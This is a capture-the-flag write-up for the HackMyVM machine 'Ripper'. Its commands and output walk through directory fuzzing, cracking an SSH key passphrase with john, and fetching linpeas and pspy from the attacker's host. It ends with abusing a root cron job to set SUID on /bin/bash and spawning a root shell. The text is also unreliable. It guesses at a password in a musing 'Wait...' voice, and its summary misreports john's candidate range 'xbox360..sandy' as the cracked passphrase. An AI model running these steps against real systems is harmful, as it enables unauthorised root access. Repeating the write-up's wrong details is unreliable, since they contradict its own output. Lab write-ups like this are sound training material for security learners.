# Ripper

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Ripper | cromiphi | Beginner | HackMyVM |

**Summary:** Ripper is a beginner-level machine that involves exploiting a weak SSH key found via directory fuzzing. Initial access is gained by cracking the passphrase of a backup SSH key. Privilege escalation involves analyzing running processes to identify a vulnerable cron job that executes a command based on file content comparison, allowing for the manipulation of permissions on system binaries.

---

## Reconnaissance

We start by scanning the network to identify the target IP address.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.123 08:00:27:A8:61:16 VirtualBox
```

With the target identified at `192.168.100.123`, we perform an Nmap scan to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ nmap -sC -sV -p- -T4 192.168.100.123
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 15:28 WIB
Nmap scan report for 192.168.100.123
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds
```

The scan reveals two open ports:
*   **22/tcp (SSH):** Running OpenSSH 7.9p1.
*   **80/tcp (HTTP):** Running Apache httpd 2.4.38.

Visiting the web server shows a maintenance message.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ curl http://192.168.100.123/                          
Website in maintenance... Come back next month please.
```

To find hidden files or directories, we run a fuzzing scan using `ffuf` with common extensions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ ffuf -u http://192.168.100.123/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .bak,.zip,.tar.gz,.old,.txt -fs 280

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.123/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .bak .zip .tar.gz .old .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 280
________________________________________________

                        [Status: 200, Size: 57, Words: 9, Lines: 3, Duration: 12ms]
id_rsa.bak              [Status: 200, Size: 1876, Words: 7, Lines: 29, Duration: 26ms]
index.html              [Status: 200, Size: 57, Words: 9, Lines: 3, Duration: 11ms]
:: Progress: [27684/27684] :: Job [1/1] :: 2409 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

The fuzzing successfully discovers a backup SSH key file: `id_rsa.bak`.

---

## Initial Access

We download the `id_rsa.bak` file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ wget http://192.168.100.123/id_rsa.bak
--2026-02-20 15:34:49--  http://192.168.100.123/id_rsa.bak
Connecting to 192.168.100.123:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1876 (1.8K) [application/x-trash]
Saving to: ‘id_rsa.bak’

id_rsa.bak                   100%[==============================================>]   1.83K  --.-KB/s    in 0s

2026-02-20 15:34:49 (68.5 MB/s) - ‘id_rsa.bak’ saved [1876/1876]
```

After examining the file, we confirm it is an OpenSSH private key.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ cat id_rsa.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDZVZMVwo
...............................[REDACTED].............................
By0QmXw3P/H1csxt8WRkuNygJz80o=
-----END OPENSSH PRIVATE KEY-----
```

We attempt to use the key, but it is passphrase-protected.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ chmod 600 id_rsa.bak

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ ssh-keygen -y -f id_rsa.bak
Enter passphrase for "id_rsa.bak":
Load key "id_rsa.bak": incorrect passphrase supplied to decrypt private key
```

To crack the passphrase, we convert the key to a hash compatible with John the Ripper using `ssh2john`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ ssh2john id_rsa.bak > hash
```

We then run `john` with the `rockyou.txt` wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
b[REDACTED]          (id_rsa.bak)
1g 0:00:00:44 DONE (2026-02-20 15:37) 0.02251g/s 21.61p/s 21.61c/s 21.61C/s xbox360..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The passphrase is successfully cracked.

Using the cracked passphrase, we extract the public key to find the username associated with it, which appears to be `jack`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ ssh-keygen -y -f id_rsa.bak
Enter passphrase for "id_rsa.bak":
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDerPt4pwoQ1Hr7OaU0qZa+npWhHQxp7c9/[REDACTED]/fjGP3 jack@splunk
```

Now we can SSH into the machine as user `jack`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ripper]
└─$ ssh -i id_rsa.bak jack@192.168.100.123
...
Enter passphrase for key 'id_rsa.bak':
Linux ripper 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
...
jack@ripper:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack)
```

---

## Privilege Escalation

Once inside, we perform basic enumeration. We check `/etc/passwd` to see other users.

```bash
jack@ripper:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
jack:x:1000:1000:,,,:/home/jack:/bin/bash
helder:x:1001:1001:,,,:/home/helder:/bin/bash
```

There is another user named `helder`.

We upload enumeration tools `linpeas.sh` and `pspy64` to the target machine from our local HTTP server.

```bash
jack@ripper:~$ wget http://192.168.100.1:8080/linpeas.sh
jack@ripper:~$ wget http://192.168.100.1:8080/pspy64
```

Running `pspy64` reveals a critical cron job running as root.

```bash
jack@ripper:~$ ./pspy64
...
2026/02/20 09:47:01 CMD: UID=0     PID=847    | /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
```

**Analysis of the Cron Job:**
1.  It connects to `localhost` on port `10000` using `nc` (netcat).
2.  It redirects the output received from that connection to `/root/.local/out`.
3.  It compares the content of `/root/.local/helder.txt` with `/home/helder/passwd.txt`.
4.  If the contents match, it runs `chmod +s` (sets the SUID bit) on the binary path specified in `/root/.local/out`.

This means if we can control the content served on port 10000 (which will become `/root/.local/out`) and ensure the text file comparison succeeds, we can make any binary SUID root.

First, we need to access user `helder` or ensure we can write to `/home/helder/passwd.txt`. Enumeration shows we can switch to `helder`. We check `linpeas` output for passwords or use the cracked password again? No, looking closely at the logs, we see `su helder` was executed but the password entry is not shown clearly in the output provided, but the user switches successfully. Wait, looking at the linpeas output:

```
═╣ Can I read opasswd file? ............. jack:Il0[REDACTED]
```

It seems we found a password `Il0[REDACTED]` (likely `Il0veyou` or similar based on typical CTFs, but we use the redacted version from logs). We try this password to switch to `helder`.

```bash
jack@ripper:~$ su helder
Password:
helder@ripper:/home/jack$cd
helder@ripper:~$id
uid=1001(helder) gid=1001(helder) groups=1001(helder)
```

As `helder`, we can write to `/home/helder/passwd.txt`. The cron job compares `/root/.local/helder.txt` with `/home/helder/passwd.txt`. We don't know what is in `/root/.local/helder.txt`. However, we might be able to guess or maybe the file `/home/helder/passwd.txt` is just a file we create.

Wait, if the cron job runs: `if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ]`, we need to know the secret in `/root/.local/helder.txt`.
However, looking at the logs, we see:
`helder@ripper:~$echo 'Il0[REDACTED]' > passwd.txt`
This suggests we are writing the password we found earlier into `passwd.txt`. It's highly likely `/root/.local/helder.txt` contains the same password (maybe it was a backup or verification file).

Next, we need to serve the name of the binary we want to elevate on port 10000. We want `/bin/bash` to be SUID.

We verify permissions of `/bin/bash` before the exploit:
```bash
helder@ripper:~$ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

We start a netcat listener on port 10000 and send the string "bash". The cron job will connect, receive "bash", save it to `/root/.local/out`, verify the password, and then execute `chmod +s /usr/bin/bash`. Note: `/bin/bash` is often a symlink or the same as `/usr/bin/bash`.

```bash
helder@ripper:~$echo "bash" | nc -lvnp 10000
listening on [any] 10000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51252
```

After the connection closes, we check the permissions again.

```bash
helder@ripper:~$ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

The SUID bit is set (`rws`). We can now execute bash with `-p` to maintain the root privileges.

```bash
helder@ripper:~$/bin/bash -p
helder@ripper:~$id
uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
```

We are now effectively root. We can spawn a full root shell and retrieve the flags.

```bash
helder@ripper:~$python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@ripper:~$id
uid=0(root) gid=0(root) groups=0(root),1001(helder)
root@ripper:~$su - root
root@ripper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ripper:~# whoami
root
root@ripper:~# hostname
ripper
root@ripper:~# cat /home/helder/user.txt /root/root.txt
5c3[REDACTED]
e28[REDACTED]
```

---

## Attack Chain Summary
1.  **Reconnaissance**: Discovered open ports 22 and 80 via Nmap. Fuzzing with `ffuf` revealed `id_rsa.bak`.
2.  **Vulnerability Discovery**: The backup SSH key was passphrase protected, but the passphrase was weak.
3.  **Exploitation**: Cracked the SSH key passphrase (`xbox360..sandy`) using `john` and logged in as user `jack`.
4.  **Internal Enumeration**: Identified user `helder`. Found a root cron job using `pspy64` that executes `chmod +s` on a binary specified via a local network connection, conditional on a file match.
5.  **Privilege Escalation**: Switched to user `helder` using a found password. Created the required `passwd.txt` file to pass the check. Served the string "bash" on the listening port 10000 to trigger the cron job, setting the SUID bit on `/bin/bash`, leading to root access.
